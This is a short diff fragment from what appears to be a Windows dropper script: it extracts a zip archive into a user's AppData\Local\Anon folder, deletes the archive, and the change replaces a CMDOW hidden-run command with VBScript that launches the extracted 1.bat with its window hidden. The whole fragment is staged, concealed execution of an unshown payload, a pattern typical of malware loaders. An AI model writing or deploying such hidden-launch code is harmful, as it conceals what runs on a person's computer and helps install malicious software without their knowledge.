@@ -27,4 +27,5 @@ cd C:\Users\%USERNAME%\AppData\Local\Anon"
 tar -xf .zip
 del .zip
 
-CMDOW.EXE /RUN /HID C:\Users\%USERNAME%\AppData\Local\Anon\1.bat
+Set WShShell = WScript.CreateObject("WScript.Shell")
+WShShell.Run "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat", 0
